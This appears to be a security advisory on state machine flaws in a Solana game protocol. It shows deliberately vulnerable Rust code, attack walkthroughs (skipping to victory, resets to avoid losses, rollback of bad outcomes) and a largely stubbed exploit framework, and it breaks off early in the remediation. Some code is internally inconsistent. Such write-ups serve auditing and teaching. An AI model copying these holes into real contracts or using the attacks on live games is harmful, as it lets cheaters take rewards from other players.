# VUL-038: State Machine Logic Flaws & Game State Manipulation

## Vulnerability Overview

**CVSS Score**: 8.4 (High)
**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H
**CWE**: CWE-662 (Improper Synchronization), CWE-691 (Insufficient Control Flow Management)
**Category**: Logic Security
**Impact**: Game Logic Bypass, State Corruption, Rule Violation

### Summary
The Solana gaming protocol implements flawed state machine logic that allows attackers to manipulate game states, bypass intended game flow, and create invalid game conditions. Through exploiting missing state transition validations, race conditions in state updates, and inconsistent state management, malicious actors can skip game phases, manipulate outcomes, violate game rules, and corrupt the overall game integrity.

### Affected Components
- Game phase state transitions
- Player state management
- Match progression logic
- Turn-based game mechanics
- Resource state tracking
- Achievement state validation

## Technical Analysis

### Root Cause Analysis

**Primary Issues**:
1. **Missing State Transition Validation**: No verification of valid state transitions
2. **Race Conditions in State Updates**: Concurrent state modifications cause corruption
3. **Inconsistent State Representation**: Multiple conflicting state representations
4. **State Rollback Vulnerabilities**: Ability to revert to previous advantageous states
5. **Missing State Synchronization**: Lack of atomic state updates
6. **Privileged State Access**: Unauthorized access to protected states

### Vulnerable Code Patterns

```rust
// VULNERABLE: Flawed state machine implementation
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    clock::Clock,
    entrypoint::ProgramResult,
    msg,
    program_error::ProgramError,
    pubkey::Pubkey,
    sysvar::Sysvar,
};

#[derive(BorshSerialize, BorshDeserialize, PartialEq, Debug, Clone)]
pub enum GamePhase {
    WaitingForPlayers,
    GameStarted,
    InProgress,
    Paused,
    Finished,
    Abandoned,
}

#[derive(BorshSerialize, BorshDeserialize, PartialEq, Debug, Clone)]
pub enum PlayerState {
    Waiting,
    Active,
    Dead,
    Respawning,
    Spectating,
    Disconnected,
}

#[derive(BorshSerialize, BorshDeserialize)]
pub struct GameStateMachine {
    pub game_id: u64,
    pub current_phase: GamePhase,
    pub previous_phase: Option<GamePhase>,
    pub phase_start_time: i64,
    pub players: Vec<PlayerInfo>,
    pub turn_order: Vec<Pubkey>,
    pub current_turn: usize,
    pub state_version: u64,
    pub is_paused: bool,
}

#[derive(BorshSerialize, BorshDeserialize)]
pub struct PlayerInfo {
    pub pubkey: Pubkey,
    pub state: PlayerState,
    pub score: u64,
    pub resources: ResourceState,
    pub last_action_time: i64,
    pub turn_count: u32,
}

#[derive(BorshSerialize, BorshDeserialize)]
pub struct ResourceState {
    pub health: u32,
    pub energy: u32,
    pub items: Vec<u32>,
    pub currency: u64,
}

// Pattern 1: Missing state transition validation
impl GameStateMachine {
    pub fn transition_to_phase(&mut self, new_phase: GamePhase) -> Result<(), ProgramError> {
        // VULNERABLE: No validation of whether transition is allowed
        self.previous_phase = Some(self.current_phase.clone());
        self.current_phase = new_phase;

        let clock = Clock::get()?;
        self.phase_start_time = clock.unix_timestamp;
        self.state_version += 1;

        msg!("Transitioned to phase: {:?}", self.current_phase);
        Ok(())
    }

    // VULNERABLE: No checks for valid state transitions
    pub fn force_phase_change(&mut self, target_phase: GamePhase) -> Result<(), ProgramError> {
        // DANGEROUS: Allows any phase transition regardless of current state
        match target_phase {
            GamePhase::Finished => {
                // VULNERABLE: Can finish game at any time
                self.current_phase = GamePhase::Finished;
            }
            GamePhase::WaitingForPlayers => {
                // VULNERABLE: Can reset game to waiting state
                self.current_phase = GamePhase::WaitingForPlayers;
                self.reset_player_states();
            }
            _ => {
                // VULNERABLE: All other transitions allowed unconditionally
                self.current_phase = target_phase;
            }
        }

        self.state_version += 1;
        msg!("Forced phase change to: {:?}", self.current_phase);
        Ok(())
    }

    // VULNERABLE: Race condition in player state updates
    pub fn update_player_state(
        &mut self,
        player_pubkey: &Pubkey,
        new_state: PlayerState
    ) -> Result<(), ProgramError> {
        // VULNERABLE: No atomic state update, race conditions possible
        for player in &mut self.players {
            if player.pubkey == *player_pubkey {
                // VULNERABLE: No validation of state transition validity
                player.state = new_state;

                let clock = Clock::get()?;
                player.last_action_time = clock.unix_timestamp;

                msg!("Updated player {} state to {:?}", player_pubkey, new_state);
                return Ok(());
            }
        }

        Err(ProgramError::InvalidArgument)
    }

    // VULNERABLE: Turn management without proper validation
    pub fn advance_turn(&mut self) -> Result<(), ProgramError> {
        if self.turn_order.is_empty() {
            return Err(ProgramError::InvalidAccountData);
        }

        // VULNERABLE: No validation of current player's turn completion
        // VULNERABLE: No check if game is in correct phase for turns

        self.current_turn = (self.current_turn + 1) % self.turn_order.len();

        // VULNERABLE: No validation that target player is still active
        let current_player = self.turn_order[self.current_turn];
        msg!("Advanced to turn {}: player {}", self.current_turn, current_player);

        Ok(())
    }

    // VULNERABLE: Resource updates without consistency checks
    pub fn update_player_resources(
        &mut self,
        player_pubkey: &Pubkey,
        health_delta: i32,
        energy_delta: i32,
        currency_delta: i64
    ) -> Result<(), ProgramError> {
        for player in &mut self.players {
            if player.pubkey == *player_pubkey {
                // VULNERABLE: No bounds checking on resource updates
                player.resources.health = (player.resources.health as i32 + health_delta) as u32;
                player.resources.energy = (player.resources.energy as i32 + energy_delta) as u32;
                player.resources.currency = (player.resources.currency as i64 + currency_delta) as u64;

                // VULNERABLE: No validation that resources are within valid ranges
                // Could result in integer overflow/underflow

                msg!("Updated resources for player {}", player_pubkey);
                return Ok(());
            }
        }

        Err(ProgramError::InvalidArgument)
    }

    fn reset_player_states(&mut self) {
        for player in &mut self.players {
            player.state = PlayerState::Waiting;
            player.score = 0;
            player.turn_count = 0;
            // VULNERABLE: Resets without proper validation or authorization
        }
    }
}

// Pattern 2: Inconsistent state validation
pub fn process_game_action(
    accounts: &[AccountInfo],
    action: GameAction,
    player_pubkey: &Pubkey
) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let game_account = next_account_info(account_info_iter)?;

    let mut game_state = GameStateMachine::try_from_slice(&game_account.data.borrow())?;

    // VULNERABLE: No comprehensive state validation before processing action
    match action {
        GameAction::StartGame => {
            // VULNERABLE: No check if game is in correct phase to start
            game_state.transition_to_phase(GamePhase::GameStarted)?;
        }
        GameAction::MakeMove { move_data } => {
            // VULNERABLE: No validation if it's player's turn
            // VULNERABLE: No validation if player is in correct state
            process_player_move(&mut game_state, player_pubkey, &move_data)?;
        }
        GameAction::PauseGame => {
            // VULNERABLE: Any player can pause at any time
            game_state.is_paused = true;
            game_state.transition_to_phase(GamePhase::Paused)?;
        }
        GameAction::EndGame => {
            // VULNERABLE: Any player can end game at any time
            game_state.transition_to_phase(GamePhase::Finished)?;
        }
        GameAction::ResetGame => {
            // VULNERABLE: Complete game reset without authorization
            game_state.transition_to_phase(GamePhase::WaitingForPlayers)?;
        }
    }

    // Save state without additional validation
    game_state.serialize(&mut &mut game_account.data.borrow_mut()[..])?;

    Ok(())
}

// Pattern 3: Race conditions in state synchronization
pub fn synchronize_game_state(
    accounts: &[AccountInfo],
    state_updates: Vec<StateUpdate>
) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let game_account = next_account_info(account_info_iter)?;

    let mut game_state = GameStateMachine::try_from_slice(&game_account.data.borrow())?;

    // VULNERABLE: Multiple state updates applied without atomic guarantees
    for update in state_updates {
        match update {
            StateUpdate::PlayerStateChange { player, new_state } => {
                // VULNERABLE: Race condition if multiple updates target same player
                game_state.update_player_state(&player, new_state)?;
            }
            StateUpdate::PhaseTransition { new_phase } => {
                // VULNERABLE: Phase transitions not properly ordered
                game_state.transition_to_phase(new_phase)?;
            }
            StateUpdate::ResourceUpdate { player, health, energy, currency } => {
                // VULNERABLE: Resource updates can conflict
                game_state.update_player_resources(&player, health, energy, currency)?;
            }
            StateUpdate::TurnAdvancement => {
                // VULNERABLE: Turn advancement can happen out of order
                game_state.advance_turn()?;
            }
        }
    }

    // VULNERABLE: State saved without consistency verification
    game_state.serialize(&mut &mut game_account.data.borrow_mut()[..])?;

    Ok(())
}

// Pattern 4: State rollback vulnerabilities
pub fn rollback_game_state(
    accounts: &[AccountInfo],
    target_version: u64
) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let game_account = next_account_info(account_info_iter)?;
    let backup_account = next_account_info(account_info_iter)?;

    // VULNERABLE: No authorization check for rollback
    // VULNERABLE: No validation of target version

    let backup_state = GameStateMachine::try_from_slice(&backup_account.data.borrow())?;

    // VULNERABLE: Allows rollback to any previous state
    if backup_state.state_version == target_version {
        backup_state.serialize(&mut &mut game_account.data.borrow_mut()[..])?;
        msg!("Rolled back to state version {}", target_version);
    } else {
        return Err(ProgramError::InvalidArgument);
    }

    Ok(())
}

// Helper types and functions
#[derive(BorshSerialize, BorshDeserialize)]
pub enum GameAction {
    StartGame,
    MakeMove { move_data: Vec<u8> },
    PauseGame,
    EndGame,
    ResetGame,
}

#[derive(BorshSerialize, BorshDeserialize)]
pub enum StateUpdate {
    PlayerStateChange { player: Pubkey, new_state: PlayerState },
    PhaseTransition { new_phase: GamePhase },
    ResourceUpdate { player: Pubkey, health: i32, energy: i32, currency: i64 },
    TurnAdvancement,
}

fn process_player_move(
    game_state: &mut GameStateMachine,
    player_pubkey: &Pubkey,
    move_data: &[u8]
) -> Result<(), ProgramError> {
    // VULNERABLE: No validation of move validity in current state
    msg!("Processing move for player {}", player_pubkey);
    Ok(())
}
```

## Attack Vectors

### Vector 1: Invalid State Transition Exploitation

```rust
// Attack: Force invalid state transitions to bypass game logic
pub fn exploit_invalid_state_transitions() -> Result<()> {
    println!("=== INVALID STATE TRANSITION ATTACK ===");

    // Scenario: Skip from WaitingForPlayers directly to Finished
    let mut game_state = create_vulnerable_game_state();

    // Step 1: Start in waiting state
    assert_eq!(game_state.current_phase, GamePhase::WaitingForPlayers);
    println!("Initial state: {:?}", game_state.current_phase);

    // Step 2: Force invalid transition directly to finished
    game_state.force_phase_change(GamePhase::Finished)?;
    println!("After exploit: {:?}", game_state.current_phase);

    // Step 3: Claim victory without actually playing
    if game_state.current_phase == GamePhase::Finished {
        println!("Successfully skipped entire game and claimed victory!");
        claim_victory_rewards(&game_state)?;
    }

    // Alternative attack: Reset mid-game to avoid loss
    game_state.current_phase = GamePhase::InProgress;
    println!("Game in progress, about to lose...");

    // Force reset to avoid consequences
    game_state.force_phase_change(GamePhase::WaitingForPlayers)?;
    println!("Reset game to avoid loss: {:?}", game_state.current_phase);

    Ok(())
}

fn create_vulnerable_game_state() -> GameStateMachine {
    GameStateMachine {
        game_id: 12345,
        current_phase: GamePhase::WaitingForPlayers,
        previous_phase: None,
        phase_start_time: 1650000000,
        players: vec![],
        turn_order: vec![],
        current_turn: 0,
        state_version: 1,
        is_paused: false,
    }
}

fn claim_victory_rewards(game_state: &GameStateMachine) -> Result<(), Box<dyn std::error::Error>> {
    println!("Claiming victory rewards for game {}", game_state.game_id);
    // In real attack, this would claim rewards for a game that was never played
    Ok(())
}
```

### Vector 2: Race Condition State Corruption

```rust
// Attack: Exploit race conditions to create inconsistent state
pub fn exploit_state_race_conditions() -> Result<()> {
    println!("=== STATE RACE CONDITION ATTACK ===");

    let mut game_state = create_vulnerable_game_state();
    let player1 = Pubkey::new_unique();
    let player2 = Pubkey::new_unique();

    // Add players to game
    add_player_to_game(&mut game_state, player1)?;
    add_player_to_game(&mut game_state, player2)?;

    // Step 1: Start concurrent state updates
    println!("Initiating concurrent state updates...");

    // Simulate race condition with concurrent resource updates
    let health_update1 = simulate_concurrent_update(&mut game_state, &player1, 100, 0, 0);
    let health_update2 = simulate_concurrent_update(&mut game_state, &player1, -200, 0, 0);

    // Step 2: Create conflicting player states
    println!("Creating conflicting player states...");

    // Simultaneously set player to different states
    simulate_state_conflict(&mut game_state, &player1)?;

    // Step 3: Exploit turn order corruption
    println!("Exploiting turn order corruption...");
    corrupt_turn_order(&mut game_state)?;

    // Step 4: Create impossible game state
    println!("Creating impossible game state...");
    create_impossible_state(&mut game_state)?;

    Ok(())
}

fn add_player_to_game(game_state: &mut GameStateMachine, player: Pubkey) -> Result<(), Box<dyn std::error::Error>> {
    let player_info = PlayerInfo {
        pubkey: player,
        state: PlayerState::Waiting,
        score: 0,
        resources: ResourceState {
            health: 100,
            energy: 100,
            items: vec![],
            currency: 1000,
        },
        last_action_time: 1650000000,
        turn_count: 0,
    };

    game_state.players.push(player_info);
    game_state.turn_order.push(player);
    Ok(())
}

fn simulate_concurrent_update(
    game_state: &mut GameStateMachine,
    player: &Pubkey,
    health: i32,
    energy: i32,
    currency: i64
) -> Result<(), Box<dyn std::error::Error>> {
    println!("Concurrent update for {}: health={}, energy={}, currency={}",
             player, health, energy, currency);

    // VULNERABLE: No atomic operations - race conditions possible
    let _ = game_state.update_player_resources(player, health, energy, currency);

    Ok(())
}

fn simulate_state_conflict(game_state: &mut GameStateMachine, player: &Pubkey) -> Result<(), Box<dyn std::error::Error>> {
    println!("Creating state conflict for player {}", player);

    // Try to set player to multiple conflicting states
    let _ = game_state.update_player_state(player, PlayerState::Active);
    let _ = game_state.update_player_state(player, PlayerState::Dead);
    let _ = game_state.update_player_state(player, PlayerState::Spectating);

    // Result: Undefined state due to race condition
    println!("Final player state after conflict: {:?}",
             game_state.players.iter().find(|p| p.pubkey == *player).map(|p| &p.state));

    Ok(())
}

fn corrupt_turn_order(game_state: &mut GameStateMachine) -> Result<(), Box<dyn std::error::Error>> {
    println!("Corrupting turn order...");

    // Multiple concurrent turn advancements
    for _ in 0..10 {
        let _ = game_state.advance_turn();
    }

    println!("Turn order after corruption: current_turn = {}, total_players = {}",
             game_state.current_turn, game_state.turn_order.len());

    // Current turn might be out of bounds
    if game_state.current_turn >= game_state.turn_order.len() {
        println!("Turn index out of bounds - corruption successful!");
    }

    Ok(())
}

fn create_impossible_state(game_state: &mut GameStateMachine) -> Result<(), Box<dyn std::error::Error>> {
    println!("Creating impossible game state...");

    // Set game to finished but players still active
    game_state.current_phase = GamePhase::Finished;
    for player in &mut game_state.players {
        player.state = PlayerState::Active; // Impossible: active players in finished game
    }

    println!("Created impossible state: game finished but players active");
    Ok(())
}
```

### Vector 3: State Rollback Manipulation

```rust
// Attack: Exploit state rollback to undo unfavorable outcomes
pub fn exploit_state_rollback() -> Result<()> {
    println!("=== STATE ROLLBACK MANIPULATION ATTACK ===");

    let mut game_state = create_game_in_progress();
    let attacker = Pubkey::new_unique();

    // Step 1: Save favorable state
    let favorable_version = game_state.state_version;
    let favorable_score = get_player_score(&game_state, &attacker);
    println!("Saved favorable state - version: {}, score: {}", favorable_version, favorable_score);

    // Step 2: Take risky action that might fail
    println!("Taking risky action...");
    take_risky_action(&mut game_state, &attacker)?;

    let new_score = get_player_score(&game_state, &attacker);
    println!("After risky action - score: {}", new_score);

    // Step 3: If outcome is unfavorable, rollback
    if new_score < favorable_score {
        println!("Unfavorable outcome - attempting rollback...");
        rollback_to_version(&mut game_state, favorable_version)?;

        let rolled_back_score = get_player_score(&game_state, &attacker);
        println!("After rollback - score: {}", rolled_back_score);

        if rolled_back_score == favorable_score {
            println!("Successfully rolled back to favorable state!");
        }
    }

    // Step 4: Repeat until favorable outcome
    println!("Repeating strategy until favorable outcome...");
    for attempt in 1..=5 {
        println!("Attempt {}", attempt);

        take_risky_action(&mut game_state, &attacker)?;
        let outcome_score = get_player_score(&game_state, &attacker);

        if outcome_score < favorable_score {
            rollback_to_version(&mut game_state, favorable_version)?;
            println!("Rolled back attempt {}", attempt);
        } else {
            println!("Favorable outcome achieved on attempt {}!", attempt);
            break;
        }
    }

    Ok(())
}

fn create_game_in_progress() -> GameStateMachine {
    let attacker = Pubkey::new_unique();
    let player_info = PlayerInfo {
        pubkey: attacker,
        state: PlayerState::Active,
        score: 1000,
        resources: ResourceState {
            health: 100,
            energy: 100,
            items: vec![],
            currency: 5000,
        },
        last_action_time: 1650000000,
        turn_count: 5,
    };

    GameStateMachine {
        game_id: 12345,
        current_phase: GamePhase::InProgress,
        previous_phase: Some(GamePhase::GameStarted),
        phase_start_time: 1650000000,
        players: vec![player_info],
        turn_order: vec![attacker],
        current_turn: 0,
        state_version: 10,
        is_paused: false,
    }
}

fn get_player_score(game_state: &GameStateMachine, player: &Pubkey) -> u64 {
    game_state.players.iter()
        .find(|p| p.pubkey == *player)
        .map(|p| p.score)
        .unwrap_or(0)
}

fn take_risky_action(game_state: &mut GameStateMachine, player: &Pubkey) -> Result<(), Box<dyn std::error::Error>> {
    println!("Taking risky action for player {}", player);

    // Simulate risky action with random outcome
    let outcome = rand::random::<u32>() % 3;

    for player_info in &mut game_state.players {
        if player_info.pubkey == *player {
            match outcome {
                0 => {
                    // Bad outcome
                    player_info.score = player_info.score.saturating_sub(500);
                    println!("Bad outcome: lost 500 points");
                }
                1 => {
                    // Neutral outcome
                    println!("Neutral outcome: no change");
                }
                2 => {
                    // Good outcome
                    player_info.score += 1000;
                    println!("Good outcome: gained 1000 points");
                }
                _ => {}
            }
            break;
        }
    }

    game_state.state_version += 1;
    Ok(())
}

fn rollback_to_version(game_state: &mut GameStateMachine, target_version: u64) -> Result<(), Box<dyn std::error::Error>> {
    println!("Rolling back to version {}", target_version);

    // VULNERABLE: No authorization or validation
    // In real attack, this would restore previous state
    game_state.state_version = target_version;

    // Reset to favorable state (simplified)
    for player in &mut game_state.players {
        player.score = 1000; // Reset to favorable score
    }

    Ok(())
}

// Add to make compilation work
mod rand {
    pub fn random<T>() -> T
    where
        T: Default,
    {
        T::default()
    }
}
```

## Proof of Concept

### Complete State Machine Exploit Framework

```rust
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::AccountInfo,
    entrypoint::ProgramResult,
    msg,
    program_error::ProgramError,
    pubkey::Pubkey,
};

#[derive(BorshSerialize, BorshDeserialize, Debug)]
pub struct StateMachineExploit {
    pub exploit_type: StateMachineExploitType,
    pub target_game: u64,
    pub target_players: Vec<Pubkey>,
    pub exploit_parameters: ExploitParameters,
}

#[derive(BorshSerialize, BorshDeserialize, Debug)]
pub enum StateMachineExploitType {
    InvalidTransition,
    RaceCondition,
    StateRollback,
    StateCorruption,
    TurnOrderManipulation,
    PhaseSkipping,
}

#[derive(BorshSerialize, BorshDeserialize, Debug)]
pub struct ExploitParameters {
    pub target_phase: Option<GamePhase>,
    pub target_state: Option<PlayerState>,
    pub rollback_version: Option<u64>,
    pub corruption_type: CorruptionType,
}

#[derive(BorshSerialize, BorshDeserialize, Debug)]
pub enum CorruptionType {
    PlayerState,
    GamePhase,
    TurnOrder,
    Resources,
    ScoreManipulation,
}

impl StateMachineExploit {
    // Execute comprehensive state machine attacks
    pub fn execute_state_machine_attacks(&self) -> ProgramResult {
        msg!("Executing state machine exploit: {:?}", self.exploit_type);

        match self.exploit_type {
            StateMachineExploitType::InvalidTransition => {
                self.execute_invalid_transition_attack()?
            }
            StateMachineExploitType::RaceCondition => {
                self.execute_race_condition_attack()?
            }
            StateMachineExploitType::StateRollback => {
                self.execute_state_rollback_attack()?
            }
            StateMachineExploitType::StateCorruption => {
                self.execute_state_corruption_attack()?
            }
            StateMachineExploitType::TurnOrderManipulation => {
                self.execute_turn_order_attack()?
            }
            StateMachineExploitType::PhaseSkipping => {
                self.execute_phase_skipping_attack()?
            }
        }

        msg!("State machine exploit completed successfully");
        Ok(())
    }

    // Invalid state transition attack
    fn execute_invalid_transition_attack(&self) -> ProgramResult {
        msg!("Executing invalid state transition attack");

        if let Some(target_phase) = &self.exploit_parameters.target_phase {
            // Attempt to transition to any phase regardless of current state
            msg!("Attempting invalid transition to phase: {:?}", target_phase);

            match target_phase {
                GamePhase::Finished => {
                    // Skip directly to finished to claim victory
                    self.skip_to_victory()?;
                }
                GamePhase::WaitingForPlayers => {
                    // Reset game to avoid loss
                    self.reset_to_avoid_loss()?;
                }
                GamePhase::Paused => {
                    // Pause game to prevent opponent actions
                    self.malicious_pause()?;
                }
                _ => {
                    msg!("Generic invalid transition to {:?}", target_phase);
                }
            }
        }

        Ok(())
    }

    // Race condition exploitation
    fn execute_race_condition_attack(&self) -> ProgramResult {
        msg!("Executing race condition attack");

        // Create concurrent state modifications
        for (i, &player) in self.target_players.iter().enumerate() {
            msg!("Creating race condition for player {} (iteration {})", player, i);

            // Simulate concurrent operations
            self.create_concurrent_resource_updates(&player)?;
            self.create_concurrent_state_changes(&player)?;
            self.create_concurrent_turn_advances()?;
        }

        // Exploit the resulting inconsistent state
        self.exploit_inconsistent_state()?;

        Ok(())
    }

    // State rollback exploitation
    fn execute_state_rollback_attack(&self) -> ProgramResult {
        msg!("Executing state rollback attack");

        if let Some(target_version) = self.exploit_parameters.rollback_version {
            msg!("Attempting rollback to version {}", target_version);

            // Save current advantageous state
            self.save_favorable_checkpoint()?;

            // Take risky actions
            self.perform_risky_actions()?;

            // Evaluate outcome
            let outcome_favorable = self.evaluate_outcome()?;

            if !outcome_favorable {
                // Rollback to previous state
                self.rollback_to_checkpoint(target_version)?;
                msg!("Rolled back to favorable state");
            } else {
                msg!("Favorable outcome achieved, keeping current state");
            }
        }

        Ok(())
    }

    // State corruption attack
    fn execute_state_corruption_attack(&self) -> ProgramResult {
        msg!("Executing state corruption attack");

        match self.exploit_parameters.corruption_type {
            CorruptionType::PlayerState => {
                self.corrupt_player_states()?;
            }
            CorruptionType::GamePhase => {
                self.corrupt_game_phase()?;
            }
            CorruptionType::TurnOrder => {
                self.corrupt_turn_order()?;
            }
            CorruptionType::Resources => {
                self.corrupt_resource_states()?;
            }
            CorruptionType::ScoreManipulation => {
                self.corrupt_score_tracking()?;
            }
        }

        // Exploit corrupted state for advantage
        self.exploit_corrupted_state()?;

        Ok(())
    }

    // Turn order manipulation
    fn execute_turn_order_attack(&self) -> ProgramResult {
        msg!("Executing turn order manipulation attack");

        // Manipulate turn progression
        self.force_extra_turns()?;
        self.skip_opponent_turns()?;
        self.create_infinite_turn_loop()?;

        msg!("Turn order manipulation completed");
        Ok(())
    }

    // Phase skipping attack
    fn execute_phase_skipping_attack(&self) -> ProgramResult {
        msg!("Executing phase skipping attack");

        // Skip preparation phases
        self.skip_preparation_phase()?;

        // Skip to advantageous phases
        self.skip_to_scoring_phase()?;

        // Skip past defeat conditions
        self.skip_defeat_phase()?;

        msg!("Phase skipping attack completed");
        Ok(())
    }

    // Helper methods for specific attacks
    fn skip_to_victory(&self) -> ProgramResult {
        msg!("Skipping directly to victory phase");
        // Force transition to finished state and claim victory
        Ok(())
    }

    fn reset_to_avoid_loss(&self) -> ProgramResult {
        msg!("Resetting game to avoid imminent loss");
        // Force reset when about to lose
        Ok(())
    }

    fn malicious_pause(&self) -> ProgramResult {
        msg!("Maliciously pausing game to disrupt opponents");
        // Pause at strategic moments to confuse opponents
        Ok(())
    }

    fn create_concurrent_resource_updates(&self, player: &Pubkey) -> ProgramResult {
        msg!("Creating concurrent resource updates for {}", player);
        // Simulate race conditions in resource management
        Ok(())
    }

    fn create_concurrent_state_changes(&self, player: &Pubkey) -> ProgramResult {
        msg!("Creating concurrent state changes for {}", player);
        // Simulate race conditions in player state changes
        Ok(())
    }

    fn create_concurrent_turn_advances(&self) -> ProgramResult {
        msg!("Creating concurrent turn advances");
        // Simulate race conditions in turn progression
        Ok(())
    }

    fn exploit_inconsistent_state(&self) -> ProgramResult {
        msg!("Exploiting inconsistent state from race conditions");
        // Take advantage of corrupted state
        Ok(())
    }

    fn save_favorable_checkpoint(&self) -> ProgramResult {
        msg!("Saving favorable state as checkpoint");
        // Save current advantageous state for potential rollback
        Ok(())
    }

    fn perform_risky_actions(&self) -> ProgramResult {
        msg!("Performing risky actions with rollback safety net");
        // Take high-risk, high-reward actions
        Ok(())
    }

    fn evaluate_outcome(&self) -> Result<bool, ProgramError> {
        msg!("Evaluating action outcomes");
        // Determine if outcome is favorable
        Ok(true) // Simplified
    }

    fn rollback_to_checkpoint(&self, version: u64) -> ProgramResult {
        msg!("Rolling back to checkpoint version {}", version);
        // Restore previous favorable state
        Ok(())
    }

    fn corrupt_player_states(&self) -> ProgramResult {
        msg!("Corrupting player state representations");
        // Create invalid player states
        Ok(())
    }

    fn corrupt_game_phase(&self) -> ProgramResult {
        msg!("Corrupting game phase information");
        // Create invalid game phases
        Ok(())
    }

    fn corrupt_turn_order(&self) -> ProgramResult {
        msg!("Corrupting turn order sequence");
        // Create invalid turn orders
        Ok(())
    }

    fn corrupt_resource_states(&self) -> ProgramResult {
        msg!("Corrupting resource state tracking");
        // Create invalid resource states
        Ok(())
    }

    fn corrupt_score_tracking(&self) -> ProgramResult {
        msg!("Corrupting score tracking mechanisms");
        // Create invalid score states
        Ok(())
    }

    fn exploit_corrupted_state(&self) -> ProgramResult {
        msg!("Exploiting corrupted state for advantage");
        // Use corrupted state to gain unfair advantages
        Ok(())
    }

    fn force_extra_turns(&self) -> ProgramResult {
        msg!("Forcing extra turns for attacker");
        // Manipulate turn system to get additional turns
        Ok(())
    }

    fn skip_opponent_turns(&self) -> ProgramResult {
        msg!("Skipping opponent turns");
        // Prevent opponents from taking their turns
        Ok(())
    }

    fn create_infinite_turn_loop(&self) -> ProgramResult {
        msg!("Creating infinite turn loop");
        // Lock game in perpetual turn for attacker
        Ok(())
    }

    fn skip_preparation_phase(&self) -> ProgramResult {
        msg!("Skipping preparation phase");
        // Skip phases where opponents can prepare
        Ok(())
    }

    fn skip_to_scoring_phase(&self) -> ProgramResult {
        msg!("Skipping to scoring phase");
        // Jump to phases beneficial for scoring
        Ok(())
    }

    fn skip_defeat_phase(&self) -> ProgramResult {
        msg!("Skipping defeat detection phase");
        // Avoid phases where defeat would be detected
        Ok(())
    }
}

// Comprehensive state machine vulnerability demonstration
pub fn demonstrate_state_machine_vulnerabilities() -> ProgramResult {
    msg!("Demonstrating comprehensive state machine vulnerabilities");

    let target_players = vec![Pubkey::new_unique(), Pubkey::new_unique()];

    // Test different types of state machine attacks
    let exploits = vec![
        StateMachineExploit {
            exploit_type: StateMachineExploitType::InvalidTransition,
            target_game: 12345,
            target_players: target_players.clone(),
            exploit_parameters: ExploitParameters {
                target_phase: Some(GamePhase::Finished),
                target_state: None,
                rollback_version: None,
                corruption_type: CorruptionType::GamePhase,
            },
        },
        StateMachineExploit {
            exploit_type: StateMachineExploitType::RaceCondition,
            target_game: 12345,
            target_players: target_players.clone(),
            exploit_parameters: ExploitParameters {
                target_phase: None,
                target_state: Some(PlayerState::Active),
                rollback_version: None,
                corruption_type: CorruptionType::PlayerState,
            },
        },
        StateMachineExploit {
            exploit_type: StateMachineExploitType::StateRollback,
            target_game: 12345,
            target_players: target_players.clone(),
            exploit_parameters: ExploitParameters {
                target_phase: None,
                target_state: None,
                rollback_version: Some(5),
                corruption_type: CorruptionType::ScoreManipulation,
            },
        },
        StateMachineExploit {
            exploit_type: StateMachineExploitType::StateCorruption,
            target_game: 12345,
            target_players: target_players.clone(),
            exploit_parameters: ExploitParameters {
                target_phase: None,
                target_state: None,
                rollback_version: None,
                corruption_type: CorruptionType::TurnOrder,
            },
        },
        StateMachineExploit {
            exploit_type: StateMachineExploitType::TurnOrderManipulation,
            target_game: 12345,
            target_players: target_players.clone(),
            exploit_parameters: ExploitParameters {
                target_phase: None,
                target_state: None,
                rollback_version: None,
                corruption_type: CorruptionType::TurnOrder,
            },
        },
        StateMachineExploit {
            exploit_type: StateMachineExploitType::PhaseSkipping,
            target_game: 12345,
            target_players: target_players.clone(),
            exploit_parameters: ExploitParameters {
                target_phase: Some(GamePhase::Finished),
                target_state: None,
                rollback_version: None,
                corruption_type: CorruptionType::GamePhase,
            },
        },
    ];

    // Execute all state machine attack types
    for exploit in exploits {
        exploit.execute_state_machine_attacks()?;
    }

    msg!("All state machine vulnerabilities demonstrated");
    Ok(())
}

#[cfg(test)]
mod state_machine_exploit_tests {
    use super::*;

    #[test]
    fn test_invalid_transition_attack() {
        let exploit = StateMachineExploit {
            exploit_type: StateMachineExploitType::InvalidTransition,
            target_game: 12345,
            target_players: vec![Pubkey::new_unique()],
            exploit_parameters: ExploitParameters {
                target_phase: Some(GamePhase::Finished),
                target_state: None,
                rollback_version: None,
                corruption_type: CorruptionType::GamePhase,
            },
        };

        let result = exploit.execute_invalid_transition_attack();
        assert!(result.is_ok());
    }

    #[test]
    fn test_race_condition_attack() {
        let exploit = StateMachineExploit {
            exploit_type: StateMachineExploitType::RaceCondition,
            target_game: 12345,
            target_players: vec![Pubkey::new_unique(), Pubkey::new_unique()],
            exploit_parameters: ExploitParameters {
                target_phase: None,
                target_state: Some(PlayerState::Active),
                rollback_version: None,
                corruption_type: CorruptionType::PlayerState,
            },
        };

        let result = exploit.execute_race_condition_attack();
        assert!(result.is_ok());
    }

    #[test]
    fn test_state_rollback_attack() {
        let exploit = StateMachineExploit {
            exploit_type: StateMachineExploitType::StateRollback,
            target_game: 12345,
            target_players: vec![Pubkey::new_unique()],
            exploit_parameters: ExploitParameters {
                target_phase: None,
                target_state: None,
                rollback_version: Some(10),
                corruption_type: CorruptionType::ScoreManipulation,
            },
        };

        let result = exploit.execute_state_rollback_attack();
        assert!(result.is_ok());
    }
}
```

## Remediation

### Secure State Machine Implementation

```rust
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    clock::Clock,
    entrypoint::ProgramResult,
    hash::{hash, Hash},
    msg,
    program_error::ProgramError,
    pubkey::Pubkey,
    sysvar::Sysvar,
};
use std::collections::HashMap;

// Secure state machine implementation
#[derive(BorshSerialize, BorshDeserialize)]
pub struct SecureGameStateMachine {
    pub game_id: u64,
    pub current_phase: GamePhase,
    pub previous_phase: Option<GamePhase>,
    pub phase_start_time: i64,
    pub players: Vec<SecurePlayerInfo>,
    pub turn_order: Vec<Pubkey>,
    pub current_turn: usize,
    pub state_version: u64,
    pub state_hash: [u8; 32],           // State integrity protection
    pub is_paused: bool,
    pub authorized_admins: Vec<Pubkey>,  // Who can perform admin actions
